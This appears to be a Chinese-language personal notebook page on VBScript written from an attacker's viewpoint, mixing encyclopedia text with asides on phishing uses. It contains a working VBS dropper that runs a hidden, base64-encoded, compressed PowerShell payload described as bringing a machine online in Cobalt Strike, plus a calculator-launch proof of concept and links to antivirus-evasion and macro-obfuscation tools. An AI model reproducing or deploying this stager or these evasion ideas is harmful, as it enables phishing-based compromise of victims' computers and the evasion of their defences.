---
date: 2024-07-11
---

# VBScript

---

## 概念

> [VBScript - 维基百科，自由的百科全书 (wikipedia.org)](https://zh.wikipedia.org/wiki/VBScript)

**VBScript**（`Microsoft Visual Basic Scripting Edition`）是[微软](https://zh.wikipedia.org/wiki/微软)以 [Visual Basic](https://zh.wikipedia.org/wiki/Visual_Basic) 为蓝本开发的一种已废弃的[动态脚本](https://zh.wikipedia.org/w/index.php?title=动态脚本&action=edit&redlink=1)语言。它允许 [Microsoft Windows](https://zh.wikipedia.org/wiki/Microsoft_Windows) [系统管理员](https://zh.wikipedia.org/wiki/系统管理员)生成用于管理计算机的强大工具，无需[错误处理](https://zh.wikipedia.org/wiki/异常处理)，并具有[子程序](https://zh.wikipedia.org/wiki/子程序)和其他高级编程结构。它可以让用户完全控制计算环境的许多方面。

由于VBScript可以通过[Windows脚本宿主](https://zh.wikipedia.org/w/index.php?title=Windows脚本宿主&action=edit&redlink=1)调用[COM](https://zh.wikipedia.org/wiki/COM)，因而可以使用[Windows](https://zh.wikipedia.org/wiki/Windows)操作系统中可以被使用的程序[库](https://zh.wikipedia.org/wiki/库)，比如它可以使用[Microsoft Office](https://zh.wikipedia.org/wiki/Microsoft_Office)的库，尤其是使用[Microsoft Access](https://zh.wikipedia.org/wiki/Microsoft_Access)和[Microsoft SQL Server](https://zh.wikipedia.org/wiki/Microsoft_SQL_Server)的程序库，当然它也可以使用其它程序和操作系统本身的库。在实践中VBScript一般被用在以下三个方面：

- Windows操作系统

  VBScript可以被用来自动地完成重复性的Windows操作系统任务。在Windows操作系统中，VBScript可以在[Windows Script Host](https://zh.wikipedia.org/wiki/Windows_Script_Host)的范围内运行。

  Windows操作系统可以自动辨认和执行 `.VBS` 和 `.WSF` 两种文件格式，此外[Internet Explorer](https://zh.wikipedia.org/wiki/Internet_Explorer)可以执行HTA和CHM文件格式。VBS和WSF文件完全是文字式的，它们只能通过少数几种对话窗口与用户通讯。

  HTA和CHM文件使用HTML格式，它们的程序码可以像HTML一样被编辑和检查。

  在WSF、HTA和CHM文件中VBScript和JavaScript的程序码可以任意混合。

  HTA文件实际上是加有VBS、JavaScript成分的HTML文件。CHM文件是一种[在线帮助](https://zh.wikipedia.org/w/index.php?title=在线帮助&action=edit&redlink=1)，用户可以使用专门的编辑程序将HTML程序编辑为CHM。

  Windows 操作系统也提供一些 VBScript 脚本来进行高级管理功能，例如管理 Windows 激活密钥的 [slmgr.vbs](https://zh.wikipedia.org/w/index.php?title=Slmgr.vbs&action=edit&redlink=1)（Windows Server License Manager Script）。

  > 从这里看来可以制作 VBS钓鱼附件 调用各种WIn操作, 比如调起命令行/PowerShell执行代码之类的, 或是其他组件下载以及执行恶意程序之类的

- 网页浏览器(客户端的VBS)

  网页中的VBS可以用来控制客户端的网页浏览器（以浏览器执行VBS程序）。VBS与JavaScript在这一方面是竞争者，它们可以用来实现[动态HTML](https://zh.wikipedia.org/wiki/DHTML)，甚至可以将整个[程序](https://zh.wikipedia.org/wiki/程式)结合到[网页](https://zh.wikipedia.org/wiki/网页)中来。

  至今为止VBS在客户方面未能占优势，因为它只获得Microsoft Internet Explorer的支持（[Mozilla Suite](https://zh.wikipedia.org/wiki/Mozilla_Suite)可以透过安装一个[包](https://zh.wikipedia.org/wiki/Firefox擴充套件列表)来支持VBS），并且[IE11](https://zh.wikipedia.org/wiki/Internet_Explorer_11)起已不再支持VBScript[[1\]](https://zh.wikipedia.org/wiki/VBScript#cite_note-1)。而JavaScript则受到所有网页浏览器的支持。在Internet Explorer中VBS和JavaScript使用同样的权限，它们只能有限地使用Windows操作系统中的对象。

  > 从钓鱼的视角来看可以用来跳转到高仿钓鱼网站之类的

- 网页服务器(服务器方面的VBS)

  在网页服务器方面VBS是微软的[Active Server Pages](https://zh.wikipedia.org/wiki/Active_Server_Pages)的一部分，它与[JavaServer Pages](https://zh.wikipedia.org/wiki/JSP)和[PHP](https://zh.wikipedia.org/wiki/PHP)是竞争对手。在这里VBS的程序码直接嵌入到[HTML](https://zh.wikipedia.org/wiki/HTML)页内，这样的网页以ASP结尾。[网页服务器](https://zh.wikipedia.org/wiki/网页服务器)[Internet信息服务](https://zh.wikipedia.org/wiki/Internet信息服务)执行ASP页内的程序部分并将其结果转化为HTML传递给网页浏览器供用户使用。这样服务器可以进行数据库闻讯并将其结果放到HTML网页中。

  > 从钓鱼视角来看大概就是用于搭建伪造的钓鱼站点了吧, 不过从这个思路来看使用其他方式建站更方便(不过对于一些组织,机构,单位或许常用的站点比较老旧也可能会遇到需要使用到asp的地方)

---

## VBS + Powershell

弹计算器

```vbscript
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run "powershell -c calc.exe", 0, true
```

![image-20240712170149540](http://cdn.ayusummer233.top/DailyNotes/202407121701650.png)

---

上线 CobaltStrike:

```vbscript
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run "powershell -nop -w hidden -encodedcommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACIASAA0AHMASQBBAEEAQQBBAEEAQQBBAEEAQQBLADEAVwBhADIALwBpAHUAQgByACsAMwBQADYASwBmAEsAZwBFAEMATQBwAHkAcAArAHgAcQBwAEkAVwBFAFEAQQBpAEIAbABIAEEATAAzAGEAcAB5AEUAaABNAGMAbgBKAHYAagBBAEcASABQAC8AUABmAGoAQgBPAGgAMABkAGoAcgBuAGoASABSAE8AcABRAG8ANwBmAGkAKwBQAG4ALwBmAGkAVgA0AFAAMABVAGEATQBFAG0AVgBUAHgATABjAGcAOQBMAGkARwBKAGsATwA5AHgAdABmAHYANwBiAGUAeQBaAE4ARgAyAG4AaQB6AGMAYgAwAHIAZQBBACsATwBZAGIAcwBDAHcAQwBvADQAagA3ACsALwA1AE8AQgBRAFMANABYAFAANwBoAEEATQBpAGIANgAxAHMAeABoAGkAVQB1ADIANgBTAEMAMABJAG8ASgBMAE4AegBkADMAZAA5AGwAbgAyAEkAdgBBAGwAdgA0ADUAZwBHAEsARAB2AEQATgBoAFgAVABuAFcAeABIADMAaABjAHUALwBkAEkATgBBADgARgAyAEEAdgBOAGYAZgBmACsAZABqAFEAcQBCAEgATAAvAHYAeQBBAE4ASgB1AEYARQBIAFgAdwBBAGgARwArAFEATAAzAEwAMgA2ADEAZwB3AFEAKwBUAGcAMABIAG0AcABUADcAbQAzAHQANABLAHcAKwB3AGIAdwBCADgARgBVAHQANABZAE8ANwBZAEwAYgBxAGUAbABaADYATgBmAFIATwBrAE4AeQBoAHIAQQBVAFkAMABuAC8AdgByAHIAMQB6AGgANQBiAEgANgBXAHUANgBIAE0AYwBCAFIAUABxAGMAbABFAFkAVgB1ADIAYwBJADQAVgArAEMAKwBGAGwASwBIADgAeQBTAEEAKwBaAHkAQwBUAE8ASgBIAC8AcABhAFcAVgA4AGkAcgAxADgAcQBMAEQAUAAwAGsAQQA2ADkAYwBzAE8AYwBLADEANQB2AFoAQQBXAEQAMwArAFAAawBsAFUANgBzAFgAbgBYAHkATwBMAFYAWABHAFQAZgBmAEMAWQBhADcARQB2AGEAVAArAFgAbAA1AGYAdQBUAC8AZgAwAGMAeABpAGoAeQBJAFgAbABpAFcAUABRAHUASQBIAEcAaQBRAEgAWgBNAEsAbwBQAEEAUwBlAGgAZQBFAE0AYgBwAGwAYQBMAG0ASQB4ADgAKwB4AGMAZwBZAEUAZwBrAE0AYgBFADQAMgA1AFkAbQBOADcAQgAzADgAUAA4AGcAeABkAGoAWABHAEoAMgBYADMANwBWADcAbQB0ACsAQQBvADgAMwBjAG4AOQBWAEsAZgA5AFIAaQBVAG0AcABsAEIAUgBLADEANQB6ADQARgBUAHEAVQBMAEcAOAB1ADUAdABoADEAZgBrAEQALwBJAGIAawBLADcATwArAEgAQgBDAHYAYwBmAC8AMABzAFYAUwAyAEkAbwBRADAAbwBmAEsATwBNADMAdwArADUAZQBuADkAMwA5ADUASQB0AEkAYgB0AFAAWAB2AFUAagBsAE8AbAA5ADQAUwBvAGwAVABtAEUAZwBBAFAAVgBKAGsAbwBaAHoAVABtAEoAWQBlAFAAMABXAG4ANAB2AGIAbQAyAFoAVQArAHEAbQBoADYAawAzAHIAcQBuAE0ASgB6AHcAWABIAEYAKwA1AGwANgBTAFAAcgA5AGYANgB1AGMASAAvAE4AbgB2AFQANwBtAHgARQBqAGIARQBHAFMAbgB2ACsAOABHAGcAUwA0AFIAUgA0AFUARQBnACsANAB5AEwAdwBsAGYAUAA2AHoAbQBNAEUAdABoAGgAawBmADUAWgB2AFkAaABPAEgATQA1ADYANABIADAAQgBLAHUANwBPAFIAUwBRAGwAOQArAFYATwB1ADcAaQBMADcAcgA5AGkANwBnAHUAaQBhAEwAZQA4AFIAUQBzAFoAUQBvAGYAQQAvAG0ARQBzAE4AOABUAHYASQBVADYARABMACsATABuAHUAVwBwAGcAOQBiAFYAbQBiAHcASgBuADAAdAByAGUAVABtAFAAZAAyAG4AdQBjAHgAagBFAEUAVQBsAFQAbwAxAFoAbgBaAHMAbABUAG8ATQBBAFEANgB2AEUAZABiADAASQBYAFkAKwA2AE0AZgBXAHoAWgBlADQAYgBYAEMAWABHAEYASgBrAGcAbwBqAGQAegByADQAVgBQAEsATAAyADYANQBuADIAUABWAFUAeABzAHMAdQBnAHkARwB1AFoAYQBBAEUAMABFAGMATQBwAEsAaQBSAHMAaQBDAC8AWQBTAEQAZABrADMAQwBMAGwAUABPAGUARQBCAHgAcQB6AGsAbQBLAFUARABpAHcAbgA3AGsAbgBLAGgAMABUAFIAbgBpAEYAWAA2AFoAMwA0AFUAeQBoAHEAawBrAGgAdABnADYARABMAHAAcgBBAHUASgBHAE4AaQBzADUAMQB3AHIASwBrAHMAMwBZAEUATQByADkAeAA5AGcAMwArAHIAawBVAGgAUQBwAFYAegBlAFMAUABvAEIAbQBDAGEAQgBoAG4ANQBhADQASgBTAEsAVQA5AGIAVgBjADYAWQBmAEUAKwA5AC8AZwBmAGQAOQBpAHYAbwBQAEoARQAzAGcATgBaAEQANAByAFIARwBuAEwARwB2AHEAbABDAHoAQgAyAEkAbgBSAG0AegBSAGkARwAzAEYATQBoAEwAYwBHAFgAWABrAEwAVABXAHMAcgBNAG0ATwBsAHoAOAArAFcAZAA2AEkAeABXAFEAcABtAFMAUwBIAHkAMwBCAHkATABZAGEAbQBoAFoAagA4AHYAbgA2AHIAWABZAFAAbgBYAFUAYwBTAHQAUgBIAEsAawAyAFMAbgBSAHYAYwBqAEsAOQBKAGUAawBmAHgAQQBGAG8ANwBVADcAUAB0AGQAZwAzADUANQBTAEUAdwA3ADcAQQA5AGoATwB6AEYAawBWADQAZwBBAE4AagBOAHcANwBCAGEAZQB3ADQAcAB3ADYALwBUAHYAcABxAHQAegBaAEcATABkAFIARQBVAGoAegB1AG4AVAAwAFIAbQBTADcAVABlADUANwA2ACsAcQB4AEQAcABNAE4ARQA5AEgASABVAGwAbgBsAHgAdABRAEQASQBDAFQATgBmAHMAZAB1AG8AVwBuADIAUQBqAE0AOQBtAGEAMABlAG0ATgBlAGoAcgB4ADAAawBvAEgAZABTAHUAdABUAHEAWQBMAFYAZgAyAHgAUgBaAGwAdQBzAHUANABIAHcAZQBrAEgAMAA5AFYAUABSADYASABZADEAZABDAGoAZAAxAEIAVwBOAEwAUgBRAFIAbwA4AEQAZQBXAGEARABwADYAdwAwAFkAYQBaAHYAaABXAG0AdgB2AFQAUQBQAG8AQgAwAGYAKwA2AGsAZQB4AFQAeQBrAEsAUgArAGQATQBZACsAcgBGAGQAYgBjAEQAVgBxADYAMQA2AEEANABDAHEAMgB6ADgAYwBKAE0AcQAyAHoAQQBHAHMAagA5AGoAMwAyAEYAVABPAEkANgBwAE8AegB1AGQAMwB2AEgAUgBCAFUARgA5AHEAKwBLAHMAOABYAG0AegBYAGoAcABnAHAAQwBJAGgAbwB0AG8AdQBrAEIAUABpAHkANwBpADMAMQBkADMAWgBBAE0AMgAwAEYAawBHAEMAYwBwAFQAbQBUAFcAUgBtAGMAOQAyAEcAKwBzAFoAZABpAHYAcQA0AGEAMABHAEcASQBTAHgAaQBQAGsAMQB0AG0AZABrADYAdQBNAE8AMABvADAAcgBjAGQAKwA1AFkAMABsAGgAMAA5AE4ANgAxAHgATABoAGsARQBEAHQAQQBoAGkAbgBKADYAWQBuADMAYgBLAHIANwBtAEkASABHAGsAMQA5AGMAeQAxAGkARgB4AHoAVgB4AE4AbQBqAHQAbAB4ADQANwBEAEoAYwBEAGUARwBrADUARwA4AFAAcABHAFEAagBrAGgANAB3AEcARgB6AHEAcABvAHAANwBrAHcAdgBsAFgAOQB1ADQARwBtAFYAeQBZAGUARwBNADUAWgBCAFUAVQBLAEsAQQB6AHIAbgBhAEMAegBEAFEANwBwAE8AVgBFAEUAKwBKAFoASQBqAFAAYwBXADkAVgBFADgAWQBWAFAAZgB6AG8AZQArADAAOQAvADYAcQBYAHIAWABqAFgAagB0AGMANABKAEYAUwBoADkAMwBoAHgAbgBEAG0AVABiAHQAUwBIAFkAQgB3ADkAbgBTAEsAaAA2AHIAWAB0AHAAbwB6ADMAdQBVAEIALwB4AFMATQBuAGgAbwBMAHkANQBQAG8AMABmAFIAWgAwAGoAUwBNAHkAVgA0AHkAUwBIAHMAOQBWAFAAZgBGAHAANgAyAGwAagBGAHQARAA1AGEAQQAxADEATwBsAHEAegBpAHYAYgBBAGQANAAwAGsAMABsAHQAMABkAC8ATQBCAEgAZgBVAG4AKwAyAHIANgA4AEgAegBKAEoANgBMAFcASgA1AFgATwByAHoAUQAwAHkAZgA5AG8AegBKACsANwBwACsAbQBpADgAcABvAHIAZQAxAEYAZABiAGEAegBCAGMAUAByAGgAUgB0AGIAQQBjAEoATQAwAGIAdgAxAEcAWQB1AEgAcABTAHoARgByAG0AQwBzAFQAVQBGADgAcgBtAGkARAA3AHEAUwArAFcAQQBUAEQAMQBGADUAbQA0ADIAUQBMAGwAawB1AFAAUABHAG8ARQBVAHYATQA4AG4AYwBwAGQAQgBWAFAAbgBjAEcAcAB0AGkAMgA1AGIAQwBQAGMAZABzAGQAdABwAGkAbgBJAGkAegB6ADEAbAA1AHgAMwAzAGcAaAA1AFUANwBVADcAMQArAEYAdQB6ADIAVgBuAEkATQBSAEwAbAAyAG4AawBDADUARwBtAHQANQBVAC8AWAB6AFIANABZAEcAbQBOAEQAdAA3AFcAdwByADEAVgByADIANQA1ADEAQwBPADAANgBUADMAbgBrAHEAVQBNAEYAUgBpAEgAYwBQAFEAbQB1AGkAeAB2AGoAeQBxADYASwBsAHgAaABHAE0AbwA0ADIAUwBnAEQANABXAEoAVQBYADYAOABWAFMAMQBZAHUAMgByAHEANABGADkAVgB4AGMAeAB2AGEAKwBDAFUAQwA5AGQAVwBvADMAdAAxAHMATABHAGIAMwBCAHQATwBqADgATgBoAHAAaQBYAFAATgBCAGQAZgBuAGMAMgBEAFUAUQA3AGMAaAA3ADYAdgBUAEUAdABUAGMAOABkAFMATQBCAG8AdgBFAHoARwBHACsAbQBpAFcAdAA1AHgAcgBEAFYAawBPAGwAVQBNADMAcABUAC8AcQB6AHkAVwAzADQALwBuADQAcQBtAHEAeAA0ADcANQA0AEYAdQA2ADAARgA5ADAAcAArAEsAMQByAFEARABEAGYAMwBvAHIARQBCAFIAOABWADEAQgBWAGYAWgBJADIAOAArAGEAVABqAEQAUwA2AHQAcQA0AEUAVABZAHIARQBlADEAWQBaADYAKwBuAEsAMABDAHkAdABLAEcAbABpAHEAYgBEAGQATwBmAFkARgA2AHUAWABuAEEANAAzAEwARgBkAFoAagBjAHEARwBkAEUANQByAFYAUQBaADYAVgByAFAAeQBCAGoAYQBzADQANABtAGUAYQA2AEQAZABPADUAcQBEAE8ARAB5AHgALwB3AHIATAB5AGUASwBLAHkAUgA1AFQAbQBUAEMAcwBzAGIAeABXAGoARgBWADQAWgBIAGsATgBXAG8ATABYAGIAUgBuAE8AcwByAGsAVQBRADMANQBHAHAASgBoAG4AZABXADkAVQBZAEoAMgAyAFEAYQBLAHoAbQBsAEEAYwBzAHkAaQBNAEQANQBPADIAVwBlADkASgA4AC8ANgB4AG8AZwBrAHoAYQBkAEwAZgBkAFQAVgAyAGgAZwBKAGQAKwBaAEsAMQB5AGEAMQBQADIATwBSAHoAUwBxAGUASgBQAHoAagAyACsANABnAHAAOQA5ADcAcwBXAEkAdABqAHIAVABYADkAWABpAHgAbQA3AGYARAB1AC8AZQBqAGwANABmAFIANgBHAHkASABmADkANAAvAEcAaQBaAG0AcgBOACsALwB2AHYAdAA1AG0AaABRAFAANAAwAEQARgAvAE4AcABrAHAAZwBFAFEANwBnAEYAawBuAFoAZABQAFYANwBXADAAVQBmAFMASgBlAFoAeQBUAFYAUgA2AGwARwBQAHYALwA1AFcATAArAEgAeABJAE8AWQBqAGIAeABzAEsATAA2ADkASwBGADIATQBmAFQATwBkADYAbgA0AHkAWAB2ADMANQAzAHYAUABaAHkANwBsAGcAeQAzAHIAdAAwADEAWABoADIAKwBOAFEASwBOAHkAZQBQAFMAUABlAGIAcgBQAFIANQAzAHIARgAyAHcAVAA0ADcAUgBuAFoAcwBQAHUAVgBQAGgAQQA1AGgAcAA1AE4AZAB5AFcAdQBjAHEAcABYAEsAcABYADAAdAAxAEYAaAAxAG4ANgBkAEcATgA0AFAAawB2AHkANwB2AFYASQA2ACsAMwAyAEEAOAB0AEUAVgB6AGwAeQA5AEQAMgBzAGsAOQBsAHoANABmADQAegBCAGQAMQA3AC8ATwA3AHMAcABmADkAbgA4ACsASQAyADkARABOAEgAbgBsAEsAVQBQADgAcgA4AEIAVQBNAEMAcwB1AE4AOABOAEEAQQBBAD0AIgApACkAOwBJAEUAWAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAFMAdAByAGUAYQBtAFIAZQBhAGQAZQByACgATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEcAegBpAHAAUwB0AHIAZQBhAG0AKAAkAHMALABbAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgBNAG8AZABlAF0AOgA6AEQAZQBjAG8AbQBwAHIAZQBzAHMAKQApACkALgBSAGUAYQBkAFQAbwBFAG4AZAAoACkAOwA=", 0, true
```

---

## 免杀

## 静态

- 仅做收集TODO, 尚未投入验证
  - VBS混淆
    - [GitHub - PDWR/3vilMacro: This is a easy tool for gen VBA code, and bypass most antivirus](https://github.com/PDWR/3vilMacro)
    - [钓鱼免杀？Miss？怎么可能？-腾讯云开发者社区-腾讯云 (tencent.com)](https://cloud.tencent.com/developer/article/1833386)









































